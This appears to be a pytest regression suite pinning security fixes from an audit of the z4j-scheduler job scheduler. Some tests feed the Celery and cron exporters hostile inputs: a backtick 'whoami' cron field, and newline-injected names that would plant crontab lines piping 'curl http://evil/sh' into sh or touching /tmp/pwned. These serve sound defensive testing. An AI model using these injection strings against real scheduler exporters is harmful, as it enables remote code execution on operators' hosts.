"""Regression tests for the second-round Apr 2026 z4j-scheduler audit.

Pins the C-2, C1-celery, fire_all_missed, source-hash, and watch-
stream-resume fixes from the deep-audit pass that followed the
first batch. Each test class names the finding so a future
refactor that silently reverts the protection trips the suite.
"""

from __future__ import annotations

import uuid
from datetime import UTC, datetime, timedelta
from unittest.mock import MagicMock

import pytest

# =====================================================================
# C-2: TriggerSchedule leader-gate check
# =====================================================================


class TestC2TriggerScheduleLeaderGate:
    """Pre-fix: TriggerScheduleServicer always dispatched, regardless
    of leader-gate state. Multiple scheduler instances behind a load
    balancer each fired the same trigger - one operator click became
    N parallel fires.

    Post-fix: standby instances return ``error_code='not_leader'``
    so brain can retry against the actual leader. Single-instance
    deployments use ``SingleInstanceLeaderGate`` (always True) so
    behavior is unchanged.
    """

    @pytest.mark.asyncio
    async def test_standby_returns_not_leader(self) -> None:
        from z4j_scheduler.proto import scheduler_pb2 as pb
        from z4j_scheduler.storage.cache import ScheduleCache
        from z4j_scheduler.tick._entry import ScheduleEntry
        from z4j_scheduler.trigger_grpc.handlers import (
            TriggerScheduleServicer,
        )

        class _StandbyGate:
            def is_leader(self, project_id) -> bool:
                return False

        cache = ScheduleCache()
        sid = uuid.uuid4()
        pid = uuid.uuid4()
        await cache.upsert(
            ScheduleEntry(
                id=sid,
                project_id=pid,
                kind="cron",
                expression="0 * * * *",
                timezone="UTC",
                is_enabled=True,
                catch_up="skip",
                anchor_at=datetime(2026, 1, 1, tzinfo=UTC),
                last_fire_at=None,
                name="x",
            ),
        )

        dispatcher = MagicMock()
        servicer = TriggerScheduleServicer(
            cache=cache,
            dispatcher=dispatcher,
            leader_gate=_StandbyGate(),
        )

        request = pb.TriggerScheduleRequest(
            schedule_id=str(sid),
            user_id="",
            idempotency_key="",
        )
        response = await servicer.TriggerSchedule(request, MagicMock())
        assert response.error_code == "not_leader"
        # And the dispatcher was NEVER invoked - no fire actually
        # left this instance.
        dispatcher.trigger_now.assert_not_called()

    @pytest.mark.asyncio
    async def test_leader_dispatches(self) -> None:
        """Counterpart: leader instance does dispatch through."""
        from z4j_scheduler.leader import SingleInstanceLeaderGate
        from z4j_scheduler.proto import scheduler_pb2 as pb
        from z4j_scheduler.storage._models import FireResult
        from z4j_scheduler.storage.cache import ScheduleCache
        from z4j_scheduler.tick._entry import ScheduleEntry
        from z4j_scheduler.trigger_grpc.handlers import (
            TriggerScheduleServicer,
        )

        cache = ScheduleCache()
        sid = uuid.uuid4()
        pid = uuid.uuid4()
        await cache.upsert(
            ScheduleEntry(
                id=sid,
                project_id=pid,
                kind="cron",
                expression="0 * * * *",
                timezone="UTC",
                is_enabled=True,
                catch_up="skip",
                anchor_at=datetime(2026, 1, 1, tzinfo=UTC),
                last_fire_at=None,
                name="x",
            ),
        )

        dispatcher = MagicMock()

        async def _ok(*, schedule_id, **_kwargs):
            return FireResult(
                command_id=uuid.uuid4(),
                error_code=None,
                error_message=None,
                buffered=False,
            )

        dispatcher.trigger_now = _ok

        servicer = TriggerScheduleServicer(
            cache=cache,
            dispatcher=dispatcher,
            leader_gate=SingleInstanceLeaderGate(),
        )

        request = pb.TriggerScheduleRequest(
            schedule_id=str(sid),
            user_id="",
            idempotency_key="",
        )
        response = await servicer.TriggerSchedule(request, MagicMock())
        assert response.error_code == ""
        assert response.command_id  # uuid string


# =====================================================================
# C1-celery: exporter solar event injection / non-finite floats
# =====================================================================


class TestC1CeleryExporterSafety:
    """Pre-fix: ``exporters/celery.py:_render_schedule_expr`` for
    ``kind='solar'`` interpolated operator-controlled event strings
    + lat/lon floats (which ``float()`` accepts as 'inf'/'nan')
    directly into a Python file the operator's celery worker imports.
    Post-fix: every branch refuses to render unsafe values."""

    def test_unknown_solar_event_refused(self) -> None:
        from z4j_scheduler.exporters._client import ExportedSchedule
        from z4j_scheduler.exporters.celery import render

        sched = ExportedSchedule(
            id="x",
            name="evil",
            engine="celery",
            kind="solar",
            expression="evil_event:0:0",
            task_name="t",
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            is_enabled=True,
        )
        out = render([sched])
        assert "REFUSED" in out
        assert "evil_event" in out
        # Critically: the rendered file must NOT contain a callable
        # ``solar(...)`` for this entry.
        assert "solar('evil_event'" not in out

    def test_nan_lat_refused(self) -> None:
        from z4j_scheduler.exporters._client import ExportedSchedule
        from z4j_scheduler.exporters.celery import render

        sched = ExportedSchedule(
            id="x",
            name="naninf",
            engine="celery",
            kind="solar",
            expression="sunrise:nan:0",
            task_name="t",
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            is_enabled=True,
        )
        out = render([sched])
        assert "REFUSED" in out
        assert "non-finite" in out

    def test_inf_lon_refused(self) -> None:
        from z4j_scheduler.exporters._client import ExportedSchedule
        from z4j_scheduler.exporters.celery import render

        sched = ExportedSchedule(
            id="x",
            name="naninf2",
            engine="celery",
            kind="solar",
            expression="sunrise:0:inf",
            task_name="t",
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            is_enabled=True,
        )
        out = render([sched])
        assert "REFUSED" in out

    def test_out_of_range_lat_refused(self) -> None:
        from z4j_scheduler.exporters._client import ExportedSchedule
        from z4j_scheduler.exporters.celery import render

        sched = ExportedSchedule(
            id="x",
            name="oor",
            engine="celery",
            kind="solar",
            expression="sunrise:91:0",
            task_name="t",
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            is_enabled=True,
        )
        out = render([sched])
        assert "REFUSED" in out
        assert "out-of-range" in out

    def test_valid_solar_renders(self) -> None:
        from z4j_scheduler.exporters._client import ExportedSchedule
        from z4j_scheduler.exporters.celery import render

        sched = ExportedSchedule(
            id="x",
            name="ok",
            engine="celery",
            kind="solar",
            expression="sunrise:40.7128:-74.0060",
            task_name="t",
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            is_enabled=True,
        )
        out = render([sched])
        assert "REFUSED" not in out
        assert "solar('sunrise', 40.7128, -74.006)" in out

    def test_unsafe_cron_field_refused(self) -> None:
        from z4j_scheduler.exporters._client import ExportedSchedule
        from z4j_scheduler.exporters.celery import render

        sched = ExportedSchedule(
            id="x",
            name="badcron",
            engine="celery",
            kind="cron",
            # Backtick in a cron field - shell metachar.
            expression="0 `whoami` * * *",
            task_name="t",
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            is_enabled=True,
        )
        out = render([sched])
        assert "REFUSED" in out
        # The rendered file must not contain ``crontab(`` for this row.
        # (The other branch comment lines are allowed to mention it.)
        active_lines = [
            line for line in out.splitlines() if line.strip() and not line.lstrip().startswith("#")
        ]
        assert not any("crontab(minute=" in line and "`whoami`" in line for line in active_lines)


# =====================================================================
# fire_all_missed: walkback through cron slots
# =====================================================================


class TestFireAllMissedWalkback:
    """Pre-fix: ``catch_up='fire_all_missed'`` on cron schedules
    behaved exactly like ``fire_one_missed`` because the engine
    only built a single-element missed list. Post-fix: the engine
    walks back through every cron slot in (last_fire_at,
    scheduled_for] and the planner trims per policy."""

    def test_fires_between_returns_all_cron_slots(self) -> None:
        from z4j_scheduler.tick.cron import fires_between

        # Hourly cron, 4-hour window → 4 slots.
        slots = fires_between(
            "0 * * * *",
            "UTC",
            after=datetime(2026, 4, 26, 12, 0, tzinfo=UTC),
            until=datetime(2026, 4, 26, 16, 0, tzinfo=UTC),
        )
        assert len(slots) == 4
        assert slots[0] == datetime(2026, 4, 26, 13, 0, tzinfo=slots[0].tzinfo)
        assert slots[-1] == datetime(2026, 4, 26, 16, 0, tzinfo=slots[-1].tzinfo)

    def test_fires_between_caps_at_max(self) -> None:
        from z4j_scheduler.tick.cron import fires_between

        # Minute cron over 365 days = ~525,000 slots. Cap=10
        # truncates aggressively.
        slots = fires_between(
            "* * * * *",
            "UTC",
            after=datetime(2026, 1, 1, tzinfo=UTC),
            until=datetime(2026, 12, 31, tzinfo=UTC),
            cap=10,
        )
        assert len(slots) == 10

    def test_fires_between_naive_datetime_rejected(self) -> None:
        from z4j_scheduler.tick.cron import fires_between

        with pytest.raises(ValueError, match="timezone-aware"):
            fires_between(
                "0 * * * *",
                "UTC",
                after=datetime(2026, 1, 1),  # naive
                until=datetime(2026, 1, 2, tzinfo=UTC),
            )


# =====================================================================
# Source-hash bypass: include engine/is_enabled/catch_up/queue
# =====================================================================


class TestSourceHashCoverage:
    """Pre-fix: ``ImportedSchedule.compute_hash`` only covered 7 of
    the 13 fields. An attacker with import-write access could flip
    ``engine: celery → rq`` (or ``is_enabled: True → False``,
    ``catch_up``, ``queue``) without changing the hash - brain
    treated the change as ``unchanged`` and emitted no audit/event.
    Post-fix: every behavior-affecting field is in the hash."""

    def _make(self, **overrides):
        from z4j_scheduler.importers._core import ImportedSchedule

        defaults = {
            "project_slug": "acme",
            "name": "hourly",
            "engine": "celery",
            "kind": "cron",
            "expression": "0 * * * *",
            "task_name": "tasks.t",
            "timezone": "UTC",
            "queue": None,
            "args": [],
            "kwargs": {},
            "catch_up": "skip",
            "is_enabled": True,
            "source": "imported",
        }
        defaults.update(overrides)
        return ImportedSchedule(**defaults)

    def test_engine_change_changes_hash(self) -> None:
        a = self._make(engine="celery").compute_hash()
        b = self._make(engine="rq").compute_hash()
        assert a != b, "engine change must change hash"

    def test_is_enabled_change_changes_hash(self) -> None:
        a = self._make(is_enabled=True).compute_hash()
        b = self._make(is_enabled=False).compute_hash()
        assert a != b, "is_enabled change must change hash"

    def test_catch_up_change_changes_hash(self) -> None:
        a = self._make(catch_up="skip").compute_hash()
        b = self._make(catch_up="fire_all_missed").compute_hash()
        assert a != b, "catch_up change must change hash"

    def test_queue_change_changes_hash(self) -> None:
        a = self._make(queue=None).compute_hash()
        b = self._make(queue="critical").compute_hash()
        assert a != b, "queue change must change hash"

    def test_source_label_change_does_not_change_hash(self) -> None:
        # Rebrand of the importer source label should NOT trigger
        # spurious update events for every schedule.
        a = self._make(source="imported_celerybeat").compute_hash()
        b = self._make(source="imported_celery_beat").compute_hash()
        assert a == b, "source label is intentionally not in the hash"


# =====================================================================
# Watch-stream resume: full-sync forwards the resume token
# =====================================================================


class TestWatchStreamResumeForward:
    """Pre-fix: every reconnect produced 2x delivery of every event
    in the (resume_token, sync_done) window because the stream's
    catch-up replayed rows the full sync just landed.
    Post-fix: ``_sync_then_watch`` advances ``self._resume_token``
    past the sync window so the stream's catch-up skips events the
    sync covered."""

    @pytest.mark.asyncio
    async def test_resume_token_advances_after_full_sync(self) -> None:
        from z4j_scheduler.storage.cache import ScheduleCache
        from z4j_scheduler.storage.watch import WatchStream

        class _FakeClient:
            async def list_schedules(self, project_id):
                # Force the async generator shape the real client
                # exposes.
                if False:
                    yield None  # type: ignore[unreachable]

            async def watch_schedules(
                self,
                project_id,
                *,
                resume_token,
            ):
                if False:
                    yield None  # type: ignore[unreachable]

        ws = WatchStream(
            client=_FakeClient(),  # type: ignore[arg-type]
            cache=ScheduleCache(),
            full_resync_interval_seconds=900.0,
        )
        ws._resume_token = ""
        # Simulate an old token from a prior session.
        before = datetime.now(UTC).isoformat()
        await ws._sync_then_watch()
        # After sync_then_watch (which runs full_sync + immediately-
        # ending stream), resume_token should be set to a value at
        # or after ``before`` rather than left empty.
        assert ws._resume_token >= before

    @pytest.mark.asyncio
    async def test_resume_token_not_downgraded(self) -> None:
        """If the stream already advanced the token past the sync
        window during a previous run, the next ``_sync_then_watch``
        must not roll it back to ``sync_started_at``."""
        from z4j_scheduler.storage.cache import ScheduleCache
        from z4j_scheduler.storage.watch import WatchStream

        class _FakeClient:
            async def list_schedules(self, project_id):
                if False:
                    yield None  # type: ignore[unreachable]

            async def watch_schedules(
                self,
                project_id,
                *,
                resume_token,
            ):
                if False:
                    yield None  # type: ignore[unreachable]

        ws = WatchStream(
            client=_FakeClient(),  # type: ignore[arg-type]
            cache=ScheduleCache(),
            full_resync_interval_seconds=900.0,
        )
        # Stash a far-future token to simulate a stream that's
        # already ahead of the sync window.
        far_future = (datetime.now(UTC) + timedelta(hours=24)).isoformat()
        ws._resume_token = far_future
        await ws._sync_then_watch()
        assert ws._resume_token == far_future, "resume token must not be downgraded by a fresh sync"


# =====================================================================
# Cache: thread-safe update_fire_state
# =====================================================================


class TestUpdateFireStateAtomicity:
    """Pre-fix: tick engine mutated ``entry.next_fire_at`` directly
    on the live object - a concurrent ``cache.upsert`` could replace
    the entry between read and write, leaving the engine writing on
    an evicted object. Post-fix: ``update_fire_state`` takes the
    cache lock and looks up the CURRENT entry by id."""

    @pytest.mark.asyncio
    async def test_update_returns_false_when_entry_removed(self) -> None:
        from z4j_scheduler.storage.cache import ScheduleCache
        from z4j_scheduler.tick._entry import ScheduleEntry

        cache = ScheduleCache()
        sid = uuid.uuid4()
        await cache.upsert(
            ScheduleEntry(
                id=sid,
                project_id=uuid.uuid4(),
                kind="cron",
                expression="0 * * * *",
                timezone="UTC",
                is_enabled=True,
                catch_up="skip",
                anchor_at=datetime(2026, 1, 1, tzinfo=UTC),
                last_fire_at=None,
                name="x",
            ),
        )
        await cache.remove(sid)
        # Update on a removed id returns False; no-op.
        result = await cache.update_fire_state(
            sid,
            last_fire_at=datetime.now(UTC),
        )
        assert result is False

    @pytest.mark.asyncio
    async def test_unset_sentinel_leaves_field_untouched(self) -> None:
        """Verify the _UNSET sentinel actually skips writing."""
        from z4j_scheduler.storage.cache import _UNSET, ScheduleCache
        from z4j_scheduler.tick._entry import ScheduleEntry

        cache = ScheduleCache()
        sid = uuid.uuid4()
        original_last = datetime(2026, 4, 26, 12, 0, tzinfo=UTC)
        await cache.upsert(
            ScheduleEntry(
                id=sid,
                project_id=uuid.uuid4(),
                kind="cron",
                expression="0 * * * *",
                timezone="UTC",
                is_enabled=True,
                catch_up="skip",
                anchor_at=datetime(2026, 1, 1, tzinfo=UTC),
                last_fire_at=original_last,
                name="x",
            ),
        )
        # Update only next_fire_at; last_fire_at unset → preserved.
        new_next = datetime(2026, 4, 26, 13, 0, tzinfo=UTC)
        await cache.update_fire_state(
            sid,
            last_fire_at=_UNSET,
            next_fire_at=new_next,
        )
        entry = await cache.get(sid)
        assert entry is not None
        assert entry.last_fire_at == original_last
        assert entry.next_fire_at == new_next

    @pytest.mark.asyncio
    async def test_explicit_none_clears_field(self) -> None:
        """Explicit None on next_fire_at clears it (one-shot exhausted)."""
        from z4j_scheduler.storage.cache import ScheduleCache
        from z4j_scheduler.tick._entry import ScheduleEntry

        cache = ScheduleCache()
        sid = uuid.uuid4()
        entry = ScheduleEntry(
            id=sid,
            project_id=uuid.uuid4(),
            kind="cron",
            expression="0 * * * *",
            timezone="UTC",
            is_enabled=True,
            catch_up="skip",
            anchor_at=datetime(2026, 1, 1, tzinfo=UTC),
            last_fire_at=None,
            name="x",
        )
        # ``next_fire_at`` is init=False on the dataclass; assign
        # post-construction.
        entry.next_fire_at = datetime(2026, 4, 26, 12, 0, tzinfo=UTC)
        await cache.upsert(entry)
        await cache.update_fire_state(sid, next_fire_at=None)
        round_tripped = await cache.get(sid)
        assert round_tripped is not None
        assert round_tripped.next_fire_at is None


# =====================================================================
# Round-3: cron exporter task_name comment-injection
# =====================================================================


class TestRound3CronExporterTaskNameSanitized:
    """Pre-fix: ``cron.py:122`` interpolated raw ``sched.task_name``
    into the DISABLED-branch comment line. A project admin who
    plants ``task_name = "x\\n* * * * * curl evil|sh\\n#"`` and
    toggles the schedule disabled produced a rendered crontab
    whose injected newline broke out of the comment, planting an
    active line. Post-fix: every comment-line interpolation goes
    through a sanitiser that strips ``\\r\\n\\x00`` and caps at 200
    chars."""

    def test_disabled_branch_strips_task_name_newlines(self) -> None:
        from z4j_scheduler.exporters._client import ExportedSchedule
        from z4j_scheduler.exporters.cron import render

        sched = ExportedSchedule(
            id="x",
            name="ok",
            engine="celery",
            kind="cron",
            expression="0 * * * *",
            task_name="x\n* * * * * curl http://evil/sh|sh\n#",
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            is_enabled=False,
        )
        out = render([sched])
        # No active cron line - every line that mentions the
        # injected substring must start with ``#``.
        for line in out.splitlines():
            stripped = line.strip()
            if "curl http://evil" in stripped:
                assert stripped.startswith("#"), (
                    f"task_name newline broke out of the comment - active line: {line!r}"
                )

    def test_interval_branch_strips_name_newlines(self) -> None:
        """Same risk in the interval-comment branch."""
        from z4j_scheduler.exporters._client import ExportedSchedule
        from z4j_scheduler.exporters.cron import render

        sched = ExportedSchedule(
            id="x",
            name="hourly\n* * * * * touch /tmp/pwned\n#",
            engine="celery",
            kind="interval",
            expression="3600s",
            task_name="t.t",
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            is_enabled=True,
        )
        out = render([sched])
        for line in out.splitlines():
            if "/tmp/pwned" in line.strip():
                assert line.strip().startswith("#"), f"name newline broke out of comment: {line!r}"

    def test_one_shot_branch_strips_name_newlines(self) -> None:
        from z4j_scheduler.exporters._client import ExportedSchedule
        from z4j_scheduler.exporters.cron import render

        sched = ExportedSchedule(
            id="x",
            name="ok\n* * * * * touch /tmp/pwned\n#",
            engine="celery",
            kind="one_shot",
            expression="2026-12-31T23:59:59Z",
            task_name="t.t",
            timezone="UTC",
            queue=None,
            args=[],
            kwargs={},
            is_enabled=True,
        )
        out = render([sched])
        for line in out.splitlines():
            if "/tmp/pwned" in line.strip():
                assert line.strip().startswith("#"), f"name newline broke out of comment: {line!r}"
